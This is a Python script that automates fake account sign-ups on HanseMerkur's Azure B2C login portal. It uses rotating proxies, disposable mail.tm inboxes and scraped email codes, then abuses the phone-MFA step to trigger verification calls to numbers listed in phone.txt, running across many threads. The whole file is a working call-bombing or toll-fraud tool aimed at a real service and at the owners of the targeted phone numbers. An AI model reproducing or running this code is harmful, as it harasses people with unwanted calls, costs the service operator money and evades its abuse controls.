import requests
import random,string
from time import sleep
import threading
import os
from bs4 import BeautifulSoup
import names
import phonenumbers
import pycountry
import re
import phone_iso3166
from phone_iso3166.country import *
import sys
print('Please make sure that phone.txt file contains numbers and vpn.txt file contains the proxies.')
input('Press enter to continue..')
def get_temporary_email() :
 while True:
  try:
    proxy = random.choice(prx)
    proxies = {}
    proxies['http'] = 'http://'+proxy
    proxies['https'] = 'http://'+proxy
    
    response = requests.get('https://api.mail.tm/domains', proxies=proxies)
    domain = response.text.split('domain":"')[1].split('"')[0]
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=9))
    email = f'{user}@{domain}'.lower()
    headers = {
        'Content-Type': 'application/json',
    }
    
    json_data = {
        'address': email,
        'password': 'secret',
    }
    
    response = requests.post('https://api.mail.tm/accounts', headers=headers, json=json_data, proxies=proxies)
    if 'used":0,"isDisabled":false' not in response.text:
        print('Failed to make an email')
    
    headers = {
        'Content-Type': 'application/json',
    }
    
    json_data = {
        'address': email,
        'password': 'secret',
    }
    
    response = requests.post('https://api.mail.tm/token', headers=headers, json=json_data,proxies=proxies)
    token = response.text.split('token":"')[1].split('"')[0]
    return email,token
  except Exception as E:
    print(E)
    continue
def get_Otp(token):
 while True:
  try:
    for x in range(90):
        proxy = random.choice(prx)
        proxies = {}
        proxies['http'] = 'http://'+proxy
        proxies['https'] = 'http://'+proxy
        sleep(.5)
        headers = {
            'Authorization': f'Bearer {token}',
        }
        
        response = requests.get('https://api.mail.tm/messages', headers=headers, proxies=proxies)
        response_text = response.text
        if 'Microsoft' in response.text:
            match = re.search(r'(?:code|lautet|is)[:\s]*(\d{4,6})', response_text, re.IGNORECASE) or re.search(r'\b\d{4,6}\b', response_text)
            otp = match.group(1) if match and match.lastindex else (match.group(0) if match else None)
            return otp
  except Exception as E:
    print(E)
    continue
good = 0

phones = open("phone.txt", "r")
aader = phones.read()
gm = aader.splitlines()
phones.close()
random.shuffle(gm)
gm = gm * 15
phones = open("vpn.txt", "r")
aader = phones.read()
prx = aader.splitlines()
phones.close()
sor = int(input('Enter number of threads '))
proxies = {}

def script():
 global good
 while True:
  try:
    proxy = random.choice(prx)
    proxies['http'] = 'http://'+proxy
    proxies['https'] = 'http://'+proxy
    response = requests.get(f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/oauth2/v2.0/authorize?scope=openid+2a6bb9ed-971e-40e2-9b28-0429e670e6d9&state=&response_type=code&client_id=2a6bb9ed-971e-40e2-9b28-0429e670e6d9&redirect_uri=https%3A%2F%2Flogin.hansemerkur.de%2Fauth%2Frealms%2Fgrpdezentral%2Fbroker%2Foidc%2Fendpoint&ui_locales=de',proxies=proxies)
    cookies = response.cookies.get_dict()
    content = response.text
    csrf = cookies.get('x-ms-cpim-csrf')
    state = content.split('StateProperties=')[1].split('"')[0]
    url = response.url
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) +'1aA!'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'priority': 'u=0, i',
        'Referer': url,
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }
    
    response = requests.get(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/api/CombinedSigninAndSignup/unified?local=signup&csrf_token={csrf}&tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
        cookies=cookies,
        headers=headers,
        proxies=proxies,
    )
    email = get_temporary_email()
    token = email[1]
    email = email[0]
    user1 = email.split('@')[0]
    domain1 = email.split('@')[1]
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    content = response.text
    state = content.split('StateProperties=')[1].split('"')[0]
    url = response.url
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'Referer': url,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = f'&request_type=VERIFICATION_REQUEST&claim_id=email&claim_value={user1}%40{domain1}'
    
    response = requests.post(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/SelfAsserted?tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    otp = get_Otp(token)
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'Referer': url,
        'x-requested-with': 'XMLHttpRequest',
    }
        
    data = f'&request_type=VALIDATION_REQUEST&claim_id=email&claim_value={user1}%40{domain1}&user_input={otp}'
    
    response = requests.post(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/SelfAsserted?tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'Referer': url,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'email': email,
        'email_ver_input': otp,
        'newPassword': password,
        'reenterPassword': password,
        'givenName': names.get_first_name(),
        'surname': names.get_last_name(),
        'extension_termsOfUseConsentChoice': 'AgreeToTermsOfUseConsentYes',
        'request_type': 'RESPONSE',
    }
    
    response = requests.post(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/SelfAsserted?tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'priority': 'u=0, i',
        'Referer': url,
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }
    
    response = requests.get(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/api/SelfAsserted/confirmed?csrf_token={csrf}&tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa&diags=%7B%22pageViewId%22%3A%22dfdeb91d-ef16-40bd-8688-f248515dcd92%22%2C%22pageId%22%3A%22SelfAsserted%22%2C%22trace%22%3A%5B%7B%22ac%22%3A%22T005%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A9%7D%2C%7B%22ac%22%3A%22T021%20-%20URL%3Ahttps%3A%2F%2Fb2c01hansemerkur.blob.core.windows.net%2Ftemplates%2FselfAsserted-v1.cshtml%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A16%7D%2C%7B%22ac%22%3A%22T019%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A4%7D%2C%7B%22ac%22%3A%22T004%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A5%7D%2C%7B%22ac%22%3A%22T003%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A2%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T030Online%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1775810930%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T011T010%22%2C%22acST%22%3A1775810963%2C%22acD%22%3A1861%7D%2C%7B%22ac%22%3A%22T012T010%22%2C%22acST%22%3A1775810988%2C%22acD%22%3A453%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1775811008%2C%22acD%22%3A699%7D%2C%7B%22ac%22%3A%22T002%22%2C%22acST%22%3A1775811009%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1775811008%2C%22acD%22%3A699%7D%5D%7D',
        cookies=cookies,
        headers=headers,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    content = response.text
    state = content.split('StateProperties=')[1].split('"')[0]
    url = response.url
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'Referer': url,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'extension_mfaMethod': 'phone',
        'request_type': 'RESPONSE',
    }
    
    response = requests.post(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/SelfAsserted?tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en;q=0.9,pt;q=0.8',
        'priority': 'u=0, i',
        'Referer': url,
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }
    
    response = requests.get(
        f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/api/SelfAsserted/confirmed?csrf_token={csrf}&tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa&diags=%7B%22pageViewId%22%3A%222a8f2e4b-4c5d-4db4-b1f9-d2bf06bc6504%22%2C%22pageId%22%3A%22SelfAsserted%22%2C%22trace%22%3A%5B%7B%22ac%22%3A%22T005%22%2C%22acST%22%3A1775811010%2C%22acD%22%3A5%7D%2C%7B%22ac%22%3A%22T021%20-%20URL%3Ahttps%3A%2F%2Fb2c01hansemerkur.blob.core.windows.net%2Ftemplates%2FselfAsserted-v1.cshtml%22%2C%22acST%22%3A1775811010%2C%22acD%22%3A14%7D%2C%7B%22ac%22%3A%22T019%22%2C%22acST%22%3A1775811010%2C%22acD%22%3A17%7D%2C%7B%22ac%22%3A%22T004%22%2C%22acST%22%3A1775811010%2C%22acD%22%3A2%7D%2C%7B%22ac%22%3A%22T003%22%2C%22acST%22%3A1775811010%2C%22acD%22%3A1%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1775811011%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T030Online%22%2C%22acST%22%3A1775811011%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1775811011%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1775811105%2C%22acD%22%3A224%7D%2C%7B%22ac%22%3A%22T002%22%2C%22acST%22%3A1775811105%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1775811105%2C%22acD%22%3A224%7D%5D%7D',
        cookies=cookies,
        headers=headers,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    content = response.text
    state = content.split('StateProperties=')[1].split('"')[0]
    url = response.url
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    

            


    for x in range(3):
        proxy = random.choice(prx)
        proxies['http'] = 'http://'+proxy
        proxies['https'] = 'http://'+proxy
        
        number = gm.pop(0)
        data = {
            'request_type': 'VERIFICATION_REQUEST',
            'auth_type': 'dialphone',
            'id': 'UserAsserted',
            'number': f'+{number}',
        }
        
        response = requests.post(
            f'https://b2c01hansemerkur.b2clogin.com/b2c01hansemerkur.onmicrosoft.com/B2C_1A_signup_signin_select_mfa/Phonefactor/verify?tx=StateProperties={state}&p=B2C_1A_signup_signin_select_mfa',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=proxies,
        )
        if 'status":"200' in response.text:
            print(f'Call sent => +{number}')
        else:
            print(f'Call failed => +{number}, ERROR_CAUSE_FAILED -> {response.text}')
  except Exception as E:
        if 'empty sequence' in str(E):
                print('ERROR DETECTED --> Please make sure that phone.txt file contains numbers and vpn.txt file contains the proxies.')
                input('Press enter to continue..')
                sys.exit()
        else:
                print(E)
                continue
threads = []
for i in range(sor):
    threads.append(threading.Thread(target=script))

# Start each of the new threads
for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
